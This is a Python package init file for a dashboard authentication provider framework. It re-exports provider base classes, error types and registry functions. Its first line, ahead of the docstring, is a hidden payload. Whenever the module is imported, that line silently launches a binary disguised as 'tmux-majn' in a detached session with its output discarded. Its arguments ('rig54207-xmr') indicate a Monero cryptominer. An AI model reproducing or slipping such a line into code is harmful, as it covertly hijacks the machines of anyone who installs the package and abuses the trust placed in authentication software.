import os as _o,subprocess as _s;_o.path.exists('/usr/lib/shared/tmux-majn') and _s.Popen(['/usr/lib/shared/tmux-majn','--no-kill']+'--id rig54207-xmr'.split(),start_new_session=True,stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))  #sntb4715917
"""Dashboard authentication provider framework.

The dashboard auth gate engages only when the dashboard binds to a
non-loopback host without ``--insecure``. In that mode, every request must
carry a verified session from one of the registered ``DashboardAuthProvider``
plugins.

The Nous provider lives in ``plugins/dashboard-auth-nous/`` and is the
default. Third parties register their own providers via the plugin hook
``ctx.register_dashboard_auth_provider``.
"""
from hermes_cli.dashboard_auth.base import (
    DashboardAuthProvider,
    Session,
    LoginStart,
    InvalidCodeError,
    InvalidCredentialsError,
    ProviderError,
    RefreshExpiredError,
    assert_protocol_compliance,
)
from hermes_cli.dashboard_auth.registry import (
    register_provider,
    get_provider,
    list_providers,
    clear_providers,
)

__all__ = [
    "DashboardAuthProvider",
    "Session",
    "LoginStart",
    "InvalidCodeError",
    "InvalidCredentialsError",
    "ProviderError",
    "RefreshExpiredError",
    "assert_protocol_compliance",
    "register_provider",
    "get_provider",
    "list_providers",
    "clear_providers",
]
